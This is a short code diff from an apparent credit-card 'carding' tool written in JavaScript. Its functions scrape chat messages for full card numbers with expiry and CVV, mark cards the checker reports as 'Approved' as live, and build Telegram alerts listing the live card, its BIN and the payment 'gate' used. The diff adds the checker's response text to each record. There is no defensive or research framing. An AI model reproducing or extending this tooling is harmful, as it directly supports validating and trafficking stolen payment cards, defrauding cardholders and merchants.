@@ -249,6 +249,7 @@ async function getCardsStatuses() {
   var regexCard = /\d{16,}\|(\d{1}|\d{2})\|(\d{2}|\d{4})\|(\d{3,4})/g;
   var matches= allMessages.filter(e => e.innerText.match(regexCard)!==null && e.innerText.includes("Status ➜")).map(ele => {
     return {
+      message:ele.innerText.match(/\nMessage ➜ [^\n]+\n/)[0].replaceAll("\n","").split("➜")[1],
       live: ele.innerText.includes("Approved") ? true : false,
       card: ele.innerText.match(regexCard)[0],
       date:generateDate()
@@ -362,6 +363,7 @@ async function notificartelegramTarjetaLive(liveCardObj) {
   var message = "";
   message+="Live Card ✅\n\n";
   message+="*Card:* `"+liveCardObj.card+"`\n";
+  message+="*Message:* `"+liveCardObj.message+"`\n";
   message+="*Date:* `"+liveCardObj.date+"`\n";
   message+="*Bin:* `"+bin+"`\n";
   message+="*Gate:* `"+gate+"`";
